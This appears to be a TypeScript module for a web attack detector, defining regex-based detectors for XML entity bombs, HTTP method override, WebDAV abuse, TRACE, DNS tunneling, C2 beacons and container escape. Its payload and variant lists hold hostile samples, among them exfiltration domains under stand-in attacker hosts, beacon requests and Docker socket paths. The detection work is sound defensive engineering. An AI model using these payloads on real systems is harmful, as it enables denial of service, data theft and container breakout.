import type { InvariantClassModule } from '../types.js'
import { deepDecode } from '../encoding.js'

const XML_ENTITY_DEFINITION_RE = /<!ENTITY\s+\w+/i
const XML_ENTITY_CHAIN_RE = /<!ENTITY\s+\w+\s+"[^"]*&\w+;[^"]*"/i

const HTTP_VERB_TAMPERING_HEADER_RE = /(?:^|\n|\r)\s*(?:x-http-method(?:-override)?|x-method-override)\s*:\s*(?:DELETE|PUT|PATCH|CONNECT|TRACE|TRACK)/i
const HTTP_VERB_TAMPERING_PARAM_RE = /[?&]_method\s*=\s*(?:DELETE|PUT|PATCH|CONNECT|TRACE|TRACK)/i

const WEBDAV_METHOD_LINE_RE = /^(?:PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK|SEARCH|SUBSCRIBE|UNSUBSCRIBE|POLL)\s+[\/\S]+\s+HTTP\//im
const WEBDAV_METHOD_INLINE_RE = /(?:^|\n)\s*(?:PROPFIND|PROPPATCH|MKCOL|COPY|MOVE|LOCK|UNLOCK)\s/im

const TRACE_TRACK_RE = /^(?:TRACE|TRACK)\s+[\/\S*]+\s+HTTP\//im

const DNS_LONG_LABEL_RE = /\b([A-Za-z0-9+/=]{20,})\.(?:[A-Za-z0-9-]{2,}\.)+[A-Za-z]{2,}\b/g
const DNS_DOMAIN_RE = /\b(?:[A-Za-z0-9+/=-]{1,63}\.){2,}[A-Za-z]{2,}\b/g

const C2_URI_RE = /(?:GET|POST)\s+\/(?:pixel\.gif|submit\.php|jquery(?:-[\d.]+)?(?:\.min)?\.js)\s+HTTP/i
const C2_COOKIE_SHORT_B64_RE = /Cookie:\s*[A-Za-z]{2,12}=[A-Za-z0-9+/=]{12,}/i
const C2_JAVA_SERIALIZED_RE = /Content-Type:\s*application\/octet-stream[\s\S]{0,200}rO0AB/i
const C2_COOKIE_LONG_B64_RE = /Cookie:\s*\w+=(?:[A-Za-z0-9+/]{40,}={0,2})/i
const C2_COOKIE_CONTEXT_RE = /(?:Content-Type:\s*application\/octet-stream|User-Agent:\s*[^\r\n]{0,80}\s*\r?\n[^\r\n]{0,200}Cookie:)/i
const C2_EXTERNAL_REFERER_RE = /Referer:\s*https?:\/\/(?![^\r\n]*\b(?:localhost|127\.0\.0\.1)\b)[^\r\n]+/i

const CONTAINER_ESCAPE_PATTERNS: ReadonlyArray<RegExp> = [
    /\/var\/run\/docker\.sock/i,
    /\/proc\/(?:self|\d+)\/(?:environ|cgroup|maps|mem|root)/i,
    /\/sys\/fs\/cgroup\/(?:release_agent|notify_on_release)/i,
    /--privileged.*docker|docker.*--privileged/i,
    /unix:\/\/\/var\/run\/docker\.sock/i,
]

function l2FromRegex(input: string, pattern: RegExp, explanation: string, confidence = 0.88) {
    const decoded = deepDecode(input)
    const match = decoded.match(pattern)
    if (!match) return null
    return {
        detected: true,
        confidence,
        explanation,
        evidence: match[0].slice(0, 200),
    }
}

function detectDnsTunnel(decoded: string): string | null {
    const longLabelMatch = decoded.match(DNS_LONG_LABEL_RE)
    if (longLabelMatch && longLabelMatch.length > 0) {
        return longLabelMatch[0]
    }

    const domains = decoded.match(DNS_DOMAIN_RE)
    if (!domains) return null

    for (const domain of domains) {
        const labels = domain.split('.')
        const coreLabels = labels.slice(0, -2)

        for (const label of coreLabels) {
            if (/^[0-9A-Fa-f]{16,}$/.test(label)) return label
            if (/^HEX[0-9A-Fa-f]{8,}$/i.test(label)) return label
            if (/^[A-Za-z0-9+/]{14,}={0,2}$/.test(label) && /(exfil|tunnel|c2|dns)/i.test(domain)) return label
        }

        if (/\bdata\.[A-Za-z0-9+/]{12,}={0,2}\./i.test(domain)) return domain
    }

    return null
}

export const xmlBombDos: InvariantClassModule = {
    id: 'xml_bomb_dos',
    description: 'XML entity expansion denial-of-service (Billion Laughs attack)',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.95 },
    mitre: ['T1499.004'],
    cwe: 'CWE-776',
    knownPayloads: [
        '<!DOCTYPE bomb [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>',
        '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">',
        '<?xml version="1.0"?><!DOCTYPE zip [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">]',
    ],
    knownBenign: ['<!DOCTYPE html PUBLIC', '<!ENTITY copyright "2024">', '<xml>normal content</xml>'],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return XML_ENTITY_DEFINITION_RE.test(d) && XML_ENTITY_CHAIN_RE.test(d)
    },
    detectL2: (input: string) => l2FromRegex(input, XML_ENTITY_CHAIN_RE, 'L2 XML analysis found chained entity expansion in DTD definitions', 0.95),
    generateVariants: (count: number): string[] => {
        const variants = [
            '<!DOCTYPE bomb [<!ENTITY lol "lol"><!ENTITY lol2 "&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;&lol;">]>',
            '<!ENTITY lol3 "&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;&lol2;">',
            '<?xml version="1.0"?><!DOCTYPE zip [<!ENTITY a "a"><!ENTITY b "&a;&a;&a;&a;&a;&a;&a;&a;">]',
            '<!DOCTYPE d [<!ENTITY a "X"><!ENTITY b "&a;&a;"><!ENTITY c "&b;&b;">]>',
        ]
        return variants.slice(0, count)
    },
}

export const httpVerbTampering: InvariantClassModule = {
    id: 'http_verb_tampering',
    description: 'HTTP method override via X-HTTP-Method-Override or _method parameter to bypass access controls',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.82 },
    mitre: ['T1190'],
    cwe: 'CWE-650',
    knownPayloads: [
        'POST /admin/delete HTTP/1.1\r\nX-HTTP-Method-Override: DELETE',
        'POST /api/users/1 HTTP/1.1\r\nX-Method-Override: PUT',
        'POST /api/data?_method=DELETE&id=123',
        'POST /resource HTTP/1.1\r\nX-HTTP-Method: PATCH',
    ],
    knownBenign: ['POST /api/data HTTP/1.1\r\nContent-Type: application/json', 'GET /users HTTP/1.1', '_method=GET&data=normal'],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return HTTP_VERB_TAMPERING_HEADER_RE.test(d) || HTTP_VERB_TAMPERING_PARAM_RE.test(d)
    },
    detectL2: (input: string) => {
        const decoded = deepDecode(input)
        const headerMatch = decoded.match(HTTP_VERB_TAMPERING_HEADER_RE)
        const paramMatch = decoded.match(HTTP_VERB_TAMPERING_PARAM_RE)
        const evidence = headerMatch?.[0] ?? paramMatch?.[0]
        if (!evidence) return null
        return {
            detected: true,
            confidence: 0.86,
            explanation: 'L2 HTTP semantics found an override header/parameter changing the effective request method',
            evidence: evidence.slice(0, 200),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'POST /admin/delete HTTP/1.1\r\nX-HTTP-Method-Override: DELETE',
            'POST /api/users/1 HTTP/1.1\r\nX-Method-Override: PUT',
            'POST /api/data?_method=DELETE&id=123',
            'POST /resource HTTP/1.1\r\nX-HTTP-Method: PATCH',
        ]
        return variants.slice(0, count)
    },
}

export const webdavMethodAbuse: InvariantClassModule = {
    id: 'webdav_method_abuse',
    description: 'Dangerous WebDAV methods (PROPFIND, COPY, MOVE, LOCK, MKCOL) for information gathering or file manipulation',
    category: 'injection',
    severity: 'high',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1083', 'T1105'],
    cwe: 'CWE-749',
    knownPayloads: [
        'PROPFIND / HTTP/1.1\r\nHost: target.com\r\nDepth: Infinity',
        'COPY /secret.txt HTTP/1.1\r\nDestination: /public/stolen.txt',
        'MOVE /app.config HTTP/1.1\r\nDestination: /backup/app.config',
        'LOCK /important.doc HTTP/1.1',
        'MKCOL /webshell/ HTTP/1.1',
    ],
    knownBenign: ['GET /documents HTTP/1.1', 'OPTIONS / HTTP/1.1', 'PUT /upload/file.txt HTTP/1.1'],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return WEBDAV_METHOD_LINE_RE.test(d) || WEBDAV_METHOD_INLINE_RE.test(d)
    },
    detectL2: (input: string) => {
        const decoded = deepDecode(input)
        const match = decoded.match(WEBDAV_METHOD_LINE_RE) ?? decoded.match(WEBDAV_METHOD_INLINE_RE)
        if (!match) return null
        return {
            detected: true,
            confidence: 0.88,
            explanation: 'L2 HTTP parsing identified a high-risk WebDAV method invocation',
            evidence: match[0].slice(0, 200),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'PROPFIND / HTTP/1.1\r\nHost: target.com\r\nDepth: Infinity',
            'COPY /secret.txt HTTP/1.1\r\nDestination: /public/stolen.txt',
            'MOVE /app.config HTTP/1.1\r\nDestination: /backup/app.config',
            'LOCK /important.doc HTTP/1.1',
            'MKCOL /webshell/ HTTP/1.1',
        ]
        return variants.slice(0, count)
    },
}

export const traceXstAttack: InvariantClassModule = {
    id: 'trace_xst_attack',
    description: 'HTTP TRACE/TRACK method enabling Cross-Site Tracing to steal cookies',
    category: 'injection',
    severity: 'medium',
    calibration: { baseConfidence: 0.88 },
    mitre: ['T1059.007'],
    cwe: 'CWE-693',
    knownPayloads: [
        'TRACE / HTTP/1.1\r\nHost: example.com\r\nX-Sensitive-Header: secret',
        'TRACK /resource HTTP/1.1\r\nHost: victim.com',
        'TRACE /api HTTP/1.1\r\nCookie: session=abc',
        'TRACE * HTTP/1.0',
    ],
    knownBenign: ['GET /trace/logs HTTP/1.1', 'POST /tracking/events HTTP/1.1', 'trace logging enabled'],
    detect: (input: string): boolean => TRACE_TRACK_RE.test(deepDecode(input)),
    detectL2: (input: string) => l2FromRegex(input, TRACE_TRACK_RE, 'L2 HTTP method analysis found TRACE/TRACK request line', 0.89),
    generateVariants: (count: number): string[] => {
        const variants = [
            'TRACE / HTTP/1.1\r\nHost: example.com\r\nX-Sensitive-Header: secret',
            'TRACK /resource HTTP/1.1\r\nHost: victim.com',
            'TRACE /api HTTP/1.1\r\nCookie: session=abc',
            'TRACE * HTTP/1.0',
        ]
        return variants.slice(0, count)
    },
}

export const dnsTunnelingIndicator: InvariantClassModule = {
    id: 'dns_tunneling_indicator',
    description: 'DNS tunneling via encoded data in subdomain labels for covert C2 communication',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.8 },
    mitre: ['T1071.004'],
    cwe: 'CWE-913',
    knownPayloads: [
        'HEX456F6E65.c2server.evil.com',
        'bm90aGluZy10by1zZWU.exfil.attacker.io',
        'data.aGVsbG8gd29ybGQ.tunnel.net',
        'AAABBBCCCDDDEEEFFF.dns-tunnel.io',
        'MTIzNDU2Nzg5MA.exfil.domain.com A query',
    ],
    knownBenign: ['api.example.com', 'cdn.cloudflare.com', 'mail.company.org', 'subdomain.normal.com'],
    detect: (input: string): boolean => detectDnsTunnel(deepDecode(input)) !== null,
    detectL2: (input: string) => {
        const decoded = deepDecode(input)
        const evidence = detectDnsTunnel(decoded)
        if (!evidence) return null
        return {
            detected: true,
            confidence: 0.84,
            explanation: 'L2 DNS analysis found encoded/high-entropy subdomain labels consistent with tunneling',
            evidence: evidence.slice(0, 200),
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'HEX456F6E65.c2server.evil.com',
            'bm90aGluZy10by1zZWU.exfil.attacker.io',
            'data.aGVsbG8gd29ybGQ.tunnel.net',
            'AAABBBCCCDDDEEEFFF.dns-tunnel.io',
            'MTIzNDU2Nzg5MA.exfil.domain.com A query',
        ]
        return variants.slice(0, count)
    },
}

export const c2BeaconIndicator: InvariantClassModule = {
    id: 'c2_beacon_indicator',
    description: 'Cobalt Strike or other C2 framework HTTP beacon pattern',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.85 },
    mitre: ['T1071.001', 'T1102'],
    cwe: 'CWE-913',
    knownPayloads: [
        'GET /jquery-3.3.1.min.js HTTP/1.1\r\nHost: c2.example.com\r\nCookie: MSFINDM=MTIzNDU2Nzg5MA==',
        'POST /submit.php HTTP/1.1\r\nContent-Type: application/octet-stream\r\nContent-Length: 48\r\n\r\nrO0ABXNy',
        'GET /pixel.gif HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\nCookie: sid=MTIzNDU2Nzg5MAAAAAAA==',
        'POST /jquery.min.js HTTP/1.1\r\nReferer: http://attacker.com',
    ],
    knownBenign: ['GET /static/jquery-3.6.0.min.js HTTP/1.1', 'POST /api/submit HTTP/1.1\r\nContent-Type: application/json', 'GET /analytics.js HTTP/1.1'],
    detect: (input: string): boolean => {
        const d = deepDecode(input)

        if (C2_URI_RE.test(d) && C2_COOKIE_SHORT_B64_RE.test(d)) return true
        if (C2_JAVA_SERIALIZED_RE.test(d)) return true
        if (C2_COOKIE_LONG_B64_RE.test(d) && C2_COOKIE_CONTEXT_RE.test(d)) return true
        if (C2_URI_RE.test(d) && C2_EXTERNAL_REFERER_RE.test(d)) return true

        return false
    },
    detectL2: (input: string) => {
        const d = deepDecode(input)
        if (C2_URI_RE.test(d) && C2_COOKIE_SHORT_B64_RE.test(d)) {
            return {
                detected: true,
                confidence: 0.9,
                explanation: 'L2 beacon analysis matched known C2 URI paired with encoded cookie channel',
                evidence: (d.match(C2_URI_RE)?.[0] ?? 'C2 URI') + ' + ' + (d.match(C2_COOKIE_SHORT_B64_RE)?.[0] ?? 'Cookie'),
            }
        }
        if (C2_JAVA_SERIALIZED_RE.test(d)) {
            return {
                detected: true,
                confidence: 0.9,
                explanation: 'L2 beacon analysis found octet-stream traffic containing Java serialized blob marker',
                evidence: d.match(C2_JAVA_SERIALIZED_RE)?.[0]?.slice(0, 200) ?? 'application/octet-stream ... rO0AB',
            }
        }
        if (C2_COOKIE_LONG_B64_RE.test(d) && C2_COOKIE_CONTEXT_RE.test(d)) {
            return {
                detected: true,
                confidence: 0.88,
                explanation: 'L2 beacon analysis found suspiciously large base64 cookie in beacon-like HTTP context',
                evidence: d.match(C2_COOKIE_LONG_B64_RE)?.[0]?.slice(0, 200) ?? 'Cookie with long base64',
            }
        }
        if (C2_URI_RE.test(d) && C2_EXTERNAL_REFERER_RE.test(d)) {
            return {
                detected: true,
                confidence: 0.86,
                explanation: 'L2 beacon analysis found masqueraded static URI with external attacker-style referer',
                evidence: (d.match(C2_URI_RE)?.[0] ?? 'C2 URI') + ' + ' + (d.match(C2_EXTERNAL_REFERER_RE)?.[0] ?? 'Referer'),
            }
        }
        return null
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            'GET /jquery-3.3.1.min.js HTTP/1.1\r\nHost: c2.example.com\r\nCookie: MSFINDM=MTIzNDU2Nzg5MA==',
            'POST /submit.php HTTP/1.1\r\nContent-Type: application/octet-stream\r\nContent-Length: 48\r\n\r\nrO0ABXNy',
            'GET /pixel.gif HTTP/1.1\r\nUser-Agent: Mozilla/5.0\r\nCookie: sid=MTIzNDU2Nzg5MAAAAAAA==',
            'POST /jquery.min.js HTTP/1.1\r\nReferer: http://attacker.com',
        ]
        return variants.slice(0, count)
    },
}

export const containerEscapeIndicator: InvariantClassModule = {
    id: 'container_escape_indicator',
    description: 'Container escape attempt via Docker socket, /proc/self/environ, or cgroup v2 exploitation',
    category: 'injection',
    severity: 'critical',
    calibration: { baseConfidence: 0.9 },
    mitre: ['T1611'],
    cwe: 'CWE-284',
    knownPayloads: [
        '/var/run/docker.sock',
        '/proc/self/environ',
        '/proc/self/cgroup',
        '/proc/1/environ',
        'docker.sock --privileged',
        '/sys/fs/cgroup/release_agent',
        'unix:///var/run/docker.sock',
    ],
    knownBenign: ['docker ps', 'container status check', '/var/run/app.pid', '/proc/version'],
    detect: (input: string): boolean => {
        const d = deepDecode(input)
        return CONTAINER_ESCAPE_PATTERNS.some(pattern => pattern.test(d))
    },
    detectL2: (input: string) => {
        const decoded = deepDecode(input)
        const matched = CONTAINER_ESCAPE_PATTERNS.find(pattern => pattern.test(decoded))
        if (!matched) return null
        return {
            detected: true,
            confidence: 0.92,
            explanation: 'L2 container hardening analysis found a known container-escape primitive',
            evidence: decoded.match(matched)?.[0]?.slice(0, 200) ?? matched.source,
        }
    },
    generateVariants: (count: number): string[] => {
        const variants = [
            '/var/run/docker.sock',
            '/proc/self/environ',
            '/proc/self/cgroup',
            '/proc/1/environ',
            'docker.sock --privileged',
            '/sys/fs/cgroup/release_agent',
            'unix:///var/run/docker.sock',
        ]
        return variants.slice(0, count)
    },
}

export const ADVANCED_THREAT_CLASSES: InvariantClassModule[] = [
    xmlBombDos,
    httpVerbTampering,
    webdavMethodAbuse,
    traceXstAttack,
    dnsTunnelingIndicator,
    c2BeaconIndicator,
    containerEscapeIndicator,
]
